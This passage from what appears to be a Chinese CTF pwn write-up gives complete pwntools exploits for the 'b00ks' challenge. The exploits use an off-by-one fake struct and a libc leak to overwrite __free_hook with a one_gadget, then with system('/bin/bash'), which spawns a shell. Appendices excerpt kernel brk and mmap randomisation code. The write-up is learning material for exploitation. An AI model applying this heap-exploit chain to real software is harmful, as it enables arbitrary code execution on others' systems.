name:&#x27;</span>)</span><br><span class="line">io.sendline(<span class="string">&#x27;a&#x27;</span> * <span class="number">32</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#pause()</span></span><br><span class="line"><span class="comment">#add book2</span></span><br><span class="line">io.recvuntil(<span class="string">&#x27;&gt;&#x27;</span>)</span><br><span class="line">io.sendline(<span class="string">&#x27;1&#x27;</span>)</span><br><span class="line"></span><br><span class="line">io.recvuntil(<span class="string">&#x27;Enter book name size:&#x27;</span>)</span><br><span class="line">io.sendline(<span class="built_in">str</span>(<span class="number">128</span>*<span class="number">1024</span>))</span><br><span class="line"></span><br><span class="line">io.recvuntil(<span class="string">&#x27;Enter book name (Max 32 chars):&#x27;</span>)</span><br><span class="line">io.sendline(<span class="string">&#x27;object2&#x27;</span>)</span><br><span class="line"></span><br><span class="line">io.recvuntil(<span class="string">&#x27;Enter book description size:&#x27;</span>)</span><br><span class="line">io.sendline(<span class="built_in">str</span>(<span class="number">128</span>*<span class="number">1024</span>))</span><br><span class="line"></span><br><span class="line">io.recvuntil(<span class="string">&#x27;Enter book description:&#x27;</span>)</span><br><span class="line">io.sendline(<span class="string">&#x27;object2&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#pause()</span></span><br><span class="line"></span><br><span class="line"><span class="comment">##print Author</span></span><br><span class="line">io.recvuntil(<span class="string">&#x27;&gt;&#x27;</span>)</span><br><span class="line">io.sendline(<span class="string">&#x27;4&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># io.recvuntil(&#x27;Name: &#x27;)</span></span><br><span class="line"><span class="comment"># io.recvuntil(&#x27;Description: &#x27;)</span></span><br><span class="line"></span><br><span class="line">io.recvuntil(<span class="string">&#x27;Name: &#x27;</span>)</span><br><span class="line">name_mmap_addr = io.recv(<span class="number">6</span>)</span><br><span class="line">name_mmap_addr = name_mmap_addr.ljust(<span class="number">8</span>, <span class="string">b&#x27;\x00&#x27;</span>)</span><br><span class="line"></span><br><span class="line">io.recvuntil(<span class="string">&#x27;Description: &#x27;</span>)</span><br><span class="line">desc_mmap_addr = io.recv(<span class="number">6</span>)</span><br><span class="line">desc_mmap_addr = desc_mmap_addr.ljust(<span class="number">8</span>, <span class="string">b&#x27;\x00&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;name_mmap_addr : &quot;</span> + <span class="built_in">hex</span>(u64(name_mmap_addr)))</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;desc_mmap_addr : &quot;</span> + <span class="built_in">hex</span>(u64(desc_mmap_addr)))</span><br><span class="line"></span><br><span class="line">io.recvuntil(<span class="string">&#x27;Name: &#x27;</span>)</span><br><span class="line">io.recvuntil(<span class="string">&#x27;Description: &#x27;</span>)</span><br><span class="line"></span><br><span class="line">libc_base = <span class="built_in">int</span>(u64(desc_mmap_addr)) + <span class="number">0x41ff0</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;libc addr : &quot;</span> + <span class="built_in">hex</span>(libc_base))</span><br><span class="line"></span><br><span class="line">free_hook = p64(libc_base + libc.symbols[<span class="string">&quot;__free_hook&quot;</span>])</span><br><span class="line">one_gadget = p64(libc_base + <span class="number">0xe3afe</span>) <span class="comment"># 0xe3afe + 0xe3b01 + 0xe3b04</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#edit book1</span></span><br><span class="line">io.recvuntil(<span class="string">&#x27;&gt;&#x27;</span>)</span><br><span class="line">io.sendline(<span class="string">&#x27;3&#x27;</span>)</span><br><span class="line"><span class="comment"># pause()</span></span><br><span class="line">io.recvuntil(<span class="string">&#x27;Enter the book id you want to edit: &#x27;</span>)</span><br><span class="line">io.sendline(<span class="string">&#x27;1&#x27;</span>)</span><br><span class="line">io.recvuntil(<span class="string">&#x27;Enter new book description: &#x27;</span>)</span><br><span class="line">io.sendline(free_hook)</span><br><span class="line"></span><br><span class="line"><span class="comment">#edit book2</span></span><br><span class="line">io.recvuntil(<span class="string">&#x27;&gt;&#x27;</span>)</span><br><span class="line">io.sendline(<span class="string">&#x27;3&#x27;</span>)</span><br><span class="line">io.recvuntil(<span class="string">&#x27;Enter the book id you want to edit: &#x27;</span>)</span><br><span class="line">io.sendline(<span class="string">&#x27;2&#x27;</span>)</span><br><span class="line">io.recvuntil(<span class="string">&#x27;Enter new book description: &#x27;</span>)</span><br><span class="line">io.sendline(one_gadget)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;free_hook: &quot;</span> + <span class="built_in">hex</span>(libc_base + libc.symbols[<span class="string">&quot;__free_hook&quot;</span>]))</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;one gadget: &quot;</span> + <span class="built_in">hex</span>(libc_base + <span class="number">0xe3afe</span>))</span><br><span class="line"></span><br><span class="line"><span class="comment">#delete book2</span></span><br><span class="line">io.recvuntil(<span class="string">&#x27;&gt;&#x27;</span>)</span><br><span class="line">io.sendline(<span class="string">&#x27;2&#x27;</span>)</span><br><span class="line">io.recvuntil(<span class="string">&#x27;Enter the book id you want to delete:&#x27;</span>)</span><br><span class="line">io.sendline(<span class="string">&#x27;2&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#pause()</span></span><br><span class="line"></span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure><p>但是很不巧的是，onegadget是有约束相应寄存器的值需要是NULL，在我本机的环境里面这三个地址运行到时寄存器情况都不满足。</p><h2 id="细说利用（system）">细说利用（system）</h2><p>所以这里需要换一个更通用的方法，预先再创建一个book3把description字段和name字段覆盖成/bin/bash\x00，接着把freehook的地址替换成system。这样在delete时候原本free chunk会直接变成system(‘/bin/bash\x00’)。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="built_in">bin</span> = ELF(<span class="string">&#x27;b00ks&#x27;</span>)</span><br><span class="line">libc = ELF(<span class="string">&#x27;/lib/x86_64-linux-gnu/libc.so.6&#x27;</span>)</span><br><span class="line">context(arch=<span class="string">&#x27;x86&#x27;</span>, os=<span class="string">&#x27;linux&#x27;</span>, log_level=<span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line">binary_path = <span class="string">&#x27;/home/parallels/Desktop/b00ks&#x27;</span></span><br><span class="line">io = process(binary_path)</span><br><span class="line">pwnlib.gdb.attach(proc.pidof(io)[<span class="number">0</span>])</span><br><span class="line"></span><br><span class="line">io.recvuntil(<span class="string">&#x27;Enter author name:&#x27;</span>)</span><br><span class="line">io.sendline(<span class="string">&#x27;a&#x27;</span> * <span class="number">32</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># add book 1</span></span><br><span class="line">io.recvuntil(<span class="string">&#x27;&gt;&#x27;</span>)</span><br><span class="line">io.sendline(<span class="string">&#x27;1&#x27;</span>)</span><br><span class="line"></span><br><span class="line">io.recvuntil(<span class="string">&#x27;Enter book name size:&#x27;</span>)</span><br><span class="line">io.sendline(<span class="string">&#x27;64&#x27;</span>)</span><br><span class="line"></span><br><span class="line">io.recvuntil(<span class="string">&#x27;Enter book name (Max 32 chars):&#x27;</span>)</span><br><span class="line">io.sendline(<span class="string">&#x27;object1&#x27;</span>)</span><br><span class="line"></span><br><span class="line">io.recvuntil(<span class="string">&#x27;Enter book description size:&#x27;</span>)</span><br><span class="line">io.sendline(<span class="string">&#x27;32&#x27;</span>)</span><br><span class="line"></span><br><span class="line">io.recvuntil(<span class="string">&#x27;Enter book description:&#x27;</span>)</span><br><span class="line">io.sendline(<span class="string">&#x27;object1&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">##print Author</span></span><br><span class="line">io.recvuntil(<span class="string">&#x27;&gt;&#x27;</span>)</span><br><span class="line">io.sendline(<span class="string">&#x27;4&#x27;</span>)</span><br><span class="line"></span><br><span class="line">io.recvuntil(<span class="string">&#x27;Author:&#x27;</span>)</span><br><span class="line">io.recvuntil(<span class="string">&#x27;a&#x27;</span>*<span class="number">32</span>)</span><br><span class="line"></span><br><span class="line">book1_addr = io.recv(<span class="number">6</span>)</span><br><span class="line">book1_addr = book1_addr.ljust(<span class="number">8</span>, <span class="string">b&#x27;\x00&#x27;</span>)</span><br><span class="line">book1_addr = u64(book1_addr)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;The first idx in bookshelf: &quot;</span> + <span class="built_in">hex</span>(book1_addr))</span><br><span class="line"></span><br><span class="line"><span class="comment">#edit book1</span></span><br><span class="line">io.recvuntil(<span class="string">&#x27;&gt;&#x27;</span>)</span><br><span class="line">io.sendline(<span class="string">&#x27;3&#x27;</span>)</span><br><span class="line">io.recvuntil(<span class="string">&#x27;Enter the book id you want to edit: &#x27;</span>)</span><br><span class="line">io.sendline(<span class="string">&#x27;1&#x27;</span>)</span><br><span class="line">io.recvuntil(<span class="string">&#x27;Enter new book description: &#x27;</span>)</span><br><span class="line"></span><br><span class="line">fake_book_data = p64(<span class="number">0x1</span>) + p64(book1_addr + <span class="number">0x30</span> + <span class="number">4</span> + <span class="number">4</span> ) + p64(book1_addr + <span class="number">0x30</span> + <span class="number">4</span> + <span class="number">4</span> + <span class="number">8</span>) + p64(<span class="number">0xffff</span>)</span><br><span class="line">io.sendline(fake_book_data)</span><br><span class="line"></span><br><span class="line"><span class="comment">#off-by-one</span></span><br><span class="line">io.recvuntil(<span class="string">&#x27;&gt;&#x27;</span>)</span><br><span class="line">io.sendline(<span class="string">&#x27;5&#x27;</span>)</span><br><span class="line">io.recvuntil(<span class="string">&#x27;Enter author name:&#x27;</span>)</span><br><span class="line">io.sendline(<span class="string">&#x27;a&#x27;</span> * <span class="number">32</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#pause()</span></span><br><span class="line"><span class="comment">#add book2</span></span><br><span class="line">io.recvuntil(<span class="string">&#x27;&gt;&#x27;</span>)</span><br><span class="line">io.sendline(<span class="string">&#x27;1&#x27;</span>)</span><br><span class="line"></span><br><span class="line">io.recvuntil(<span class="string">&#x27;Enter book name size:&#x27;</span>)</span><br><span class="line">io.sendline(<span class="built_in">str</span>(<span class="number">128</span>*<span class="number">1024</span>))</span><br><span class="line"></span><br><span class="line">io.recvuntil(<span class="string">&#x27;Enter book name (Max 32 chars):&#x27;</span>)</span><br><span class="line">io.sendline(<span class="string">&#x27;object2&#x27;</span>)</span><br><span class="line"></span><br><span class="line">io.recvuntil(<span class="string">&#x27;Enter book description size:&#x27;</span>)</span><br><span class="line">io.sendline(<span class="built_in">str</span>(<span class="number">128</span>*<span class="number">1024</span>))</span><br><span class="line"></span><br><span class="line">io.recvuntil(<span class="string">&#x27;Enter book description:&#x27;</span>)</span><br><span class="line">io.sendline(<span class="string">&#x27;object2&#x27;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">#add book3</span></span><br><span class="line">io.recvuntil(<span class="string">&#x27;&gt;&#x27;</span>)</span><br><span class="line">io.sendline(<span class="string">&#x27;1&#x27;</span>)</span><br><span class="line"></span><br><span class="line">io.recvuntil(<span class="string">&#x27;Enter book name size:&#x27;</span>)</span><br><span class="line">io.sendline(<span class="string">&#x27;32&#x27;</span>)</span><br><span class="line"></span><br><span class="line">io.recvuntil(<span class="string">&#x27;Enter book name (Max 32 chars):&#x27;</span>)</span><br><span class="line">io.sendline(<span class="string">&#x27;/bin/bash\x00&#x27;</span>)</span><br><span class="line"></span><br><span class="line">io.recvuntil(<span class="string">&#x27;Enter book description size:&#x27;</span>)</span><br><span class="line">io.sendline(<span class="string">&#x27;32&#x27;</span>)</span><br><span class="line"></span><br><span class="line">io.recvuntil(<span class="string">&#x27;Enter book description:&#x27;</span>)</span><br><span class="line">io.sendline(<span class="string">&#x27;/bin/bash\x00&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#pause()</span></span><br><span class="line"></span><br><span class="line"><span class="comment">##print Author</span></span><br><span class="line">io.recvuntil(<span class="string">&#x27;&gt;&#x27;</span>)</span><br><span class="line">io.sendline(<span class="string">&#x27;4&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># io.recvuntil(&#x27;Name: &#x27;)</span></span><br><span class="line"><span class="comment"># io.recvuntil(&#x27;Description: &#x27;)</span></span><br><span class="line"></span><br><span class="line">io.recvuntil(<span class="string">&#x27;Name: &#x27;</span>)</span><br><span class="line">name_mmap_addr = io.recv(<span class="number">6</span>)</span><br><span class="line">name_mmap_addr = name_mmap_addr.ljust(<span class="number">8</span>, <span class="string">b&#x27;\x00&#x27;</span>)</span><br><span class="line"></span><br><span class="line">io.recvuntil(<span class="string">&#x27;Description: &#x27;</span>)</span><br><span class="line">desc_mmap_addr = io.recv(<span class="number">6</span>)</span><br><span class="line">desc_mmap_addr = desc_mmap_addr.ljust(<span class="number">8</span>, <span class="string">b&#x27;\x00&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;name_mmap_addr : &quot;</span> + <span class="built_in">hex</span>(u64(name_mmap_addr)))</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;desc_mmap_addr : &quot;</span> + <span class="built_in">hex</span>(u64(desc_mmap_addr)))</span><br><span class="line"></span><br><span class="line">io.recvuntil(<span class="string">&#x27;Name: &#x27;</span>)</span><br><span class="line">io.recvuntil(<span class="string">&#x27;Description: &#x27;</span>)</span><br><span class="line">io.recvuntil(<span class="string">&#x27;Name: &#x27;</span>)</span><br><span class="line">io.recvuntil(<span class="string">&#x27;Description: &#x27;</span>)</span><br><span class="line"></span><br><span class="line">libc_base = <span class="built_in">int</span>(u64(desc_mmap_addr)) + <span class="number">0x41ff0</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;libc addr : &quot;</span> + <span class="built_in">hex</span>(libc_base))</span><br><span class="line"></span><br><span class="line">free_hook = p64(libc_base + libc.symbols[<span class="string">&quot;__free_hook&quot;</span>])</span><br><span class="line"><span class="comment"># one_gadget = p64(libc_base + 0xe3afe) # 0xe3afe + 0xe3b01 + 0xe3b04</span></span><br><span class="line"></span><br><span class="line">system = p64(libc_base + libc.symbols[<span class="string">&quot;system&quot;</span>])</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">#edit book1</span></span><br><span class="line">io.recvuntil(<span class="string">&#x27;&gt;&#x27;</span>)</span><br><span class="line">io.sendline(<span class="string">&#x27;3&#x27;</span>)</span><br><span class="line"><span class="comment"># pause()</span></span><br><span class="line">io.recvuntil(<span class="string">&#x27;Enter the book id you want to edit: &#x27;</span>)</span><br><span class="line">io.sendline(<span class="string">&#x27;1&#x27;</span>)</span><br><span class="line">io.recvuntil(<span class="string">&#x27;Enter new book description: &#x27;</span>)</span><br><span class="line">io.sendline(free_hook)</span><br><span class="line"></span><br><span class="line"><span class="comment">#edit book2</span></span><br><span class="line">io.recvuntil(<span class="string">&#x27;&gt;&#x27;</span>)</span><br><span class="line">io.sendline(<span class="string">&#x27;3&#x27;</span>)</span><br><span class="line">io.recvuntil(<span class="string">&#x27;Enter the book id you want to edit: &#x27;</span>)</span><br><span class="line">io.sendline(<span class="string">&#x27;2&#x27;</span>)</span><br><span class="line">io.recvuntil(<span class="string">&#x27;Enter new book description: &#x27;</span>)</span><br><span class="line">io.sendline(system)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;free_hook: &quot;</span> + <span class="built_in">hex</span>(libc_base + libc.symbols[<span class="string">&quot;__free_hook&quot;</span>]))</span><br><span class="line"><span class="comment"># print(&quot;one gadget: &quot; + hex(libc_base + 0xe3afe))</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;system : &quot;</span> + <span class="built_in">hex</span>(libc_base + libc.symbols[<span class="string">&quot;system&quot;</span>]))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">#delete book3</span></span><br><span class="line">io.recvuntil(<span class="string">&#x27;&gt;&#x27;</span>)</span><br><span class="line">io.sendline(<span class="string">&#x27;2&#x27;</span>)</span><br><span class="line">io.recvuntil(<span class="string">&#x27;Enter the book id you want to delete:&#x27;</span>)</span><br><span class="line">io.sendline(<span class="string">&#x27;3&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># pause()</span></span><br><span class="line"></span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure><h2 id="附-request2size">附 request2size</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 常量定义  </span></span><br><span class="line">SIZE_SZ = <span class="number">8</span>  <span class="comment"># 64位系统上 size_t 的大小  </span></span><br><span class="line">MALLOC_ALIGN_MASK = <span class="number">15</span>  <span class="comment"># 16字节对齐掩码 (0xF)  </span></span><br><span class="line">MINSIZE = <span class="number">32</span>  <span class="comment"># 假设的最小块大小  </span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">request2size</span>(<span class="params">req</span>):  </span><br><span class="line">    <span class="keyword">if</span> req + SIZE_SZ + MALLOC_ALIGN_MASK &lt; MINSIZE:  </span><br><span class="line">        <span class="keyword">return</span> MINSIZE  </span><br><span class="line">    <span class="keyword">else</span>:  </span><br><span class="line">        <span class="keyword">return</span> (req + SIZE_SZ + MALLOC_ALIGN_MASK) &amp; ~MALLOC_ALIGN_MASK  </span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(request2size(<span class="number">32</span>)))</span><br></pre></td></tr></table></figure><h2 id="附-brk起始地址计算方式">附 brk起始地址计算方式</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line">mm-&gt;brk = mm-&gt;start_brk = arch_randomize_brk(mm);</span><br><span class="line"></span><br><span class="line"><span class="type">unsigned</span> <span class="type">long</span> <span class="title function_">arch_randomize_brk</span><span class="params">(<span class="keyword">struct</span> mm_struct *mm)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">long</span> range_end = mm-&gt;brk + <span class="number">0x02000000</span>;</span><br><span class="line">    <span class="keyword">return</span> randomize_range(mm-&gt;brk, range_end, <span class="number">0</span>) ? : mm-&gt;brk;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">unsigned</span> <span class="type">long</span></span><br><span class="line"><span class="title function_">randomize_range</span><span class="params">(<span class="type">unsigned</span> <span class="type">long</span> start, <span class="type">unsigned</span> <span class="type">long</span> end, <span class="type">unsigned</span> <span class="type">long</span> len)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">long</span> range = end - len - start;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (end &lt;= start + len)</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">return</span> PAGE_ALIGN(get_random_int() % range + start);<span class="comment">// #define PAGE_ALIGN(addr) ALIGN(addr, PAGE_SIZE)</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * Get a random word for internal kernel use only. Similar to urandom but</span></span><br><span class="line"><span class="comment"> * with the goal of minimal entropy pool depletion. As a result, the random</span></span><br><span class="line"><span class="comment"> * value is not cryptographically secure but for several uses the cost of</span></span><br><span class="line"><span class="comment"> * depleting entropy is too high</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="type">static</span> <span class="title function_">DEFINE_PER_CPU</span><span class="params">(__u32 [MD5_DIGEST_WORDS], get_random_int_hash)</span>;</span><br><span class="line"><span class="type">unsigned</span> <span class="type">int</span> <span class="title function_">get_random_int</span><span class="params">(<span class="type">void</span>)</span></span><br><span class="line">&#123;</span><br><span class="line">    __u32 *hash;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">int</span> ret;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (arch_get_random_int(&amp;ret))</span><br><span class="line">        <span class="keyword">return</span> ret;</span><br><span class="line"></span><br><span class="line">    hash = get_cpu_var(get_random_int_hash);</span><br><span class="line"></span><br><span class="line">    hash[<span class="number">0</span>] += current-&gt;pid + jiffies + random_get_entropy(); <span class="comment">//random_get_entropy This function returns the processor cycle counter value if</span></span><br><span class="line">       available, <span class="keyword">else</span> it returns zero. </span><br><span class="line">    md5_transform(hash, random_int_secret);</span><br><span class="line">    ret = hash[<span class="number">0</span>];</span><br><span class="line">    put_cpu_var(get_random_int_hash);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> ret;</span><br><span class="line">&#125;</span><br><span class="line">EXPORT_SYMBOL(get_random_int);</span><br></pre></td></tr></table></figure><h2 id="附-mmap计算方式">附 mmap计算方式</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span> <span class="title function_">arch_pick_mmap_layout</span><span class="params">(<span class="keyword">struct</span> mm_struct *mm, <span class="keyword">struct</span> rlimit *rlim_stack)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">if</span> (mmap_is_legacy())</span><br><span class="line">        clear_bit(MMF_TOPDOWN, &amp;mm-&gt;flags);</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">        set_bit(MMF_TOPDOWN, &amp;mm-&gt;flags);</span><br><span class="line"></span><br><span class="line">    arch_pick_mmap_base(&amp;mm-&gt;mmap_base, &amp;mm-&gt;mmap_legacy_base,</span><br><span class="line">            arch_rnd(mmap64_rnd_bits), task_size_64bit(<span class="number">0</span>),</span><br><span class="line">            rlim_stack);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * This function, called very early during the creation of a new</span></span><br><span class="line"><span class="comment"> * process VM image, sets up which VM layout function to use:</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="type">static</span> <span class="type">void</span> <span class="title function_">arch_pick_mmap_base</span><span class="params">(<span class="type">unsigned</span> <span class="type">long</span> *base, <span class="type">unsigned</span> <span class="type">long</span> *legacy_base,</span></span><br><span class="line"><span class="params">        <span class="type">unsigned</span> <span class="type">long</span> random_factor, <span class="type">unsigned</span> <span class="type">long</span> task_size,</span></span><br><span class="line"><span class="params">        <span class="keyword">struct</span> rlimit *rlim_stack)</span></span><br><span class="line">&#123;</span><br><span class="line">    *legacy_base = mmap_legacy_base(random_factor, task_size);</span><br><span class="line">    <span class="keyword">if</span> (mmap_is_legacy())</span><br><span class="line">        *base = *legacy_base;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">        *base = mmap_base(random_factor, task_size, rlim_stack);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">unsigned</span> <span class="type">long</span> <span class="title function_">task_size_64bit</span><span class="params">(<span class="type">int</span> full_addr_space)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">return</span> full_addr_space ? TASK_SIZE_MAX : DEFAULT_MAP_WINDOW;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">static</span> __always_inline <span class="type">unsigned</span> <span class="type">long</span> <span class="title function_">task_size_max</span><span class="params">(<span class="type">void</span>)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">long</span> 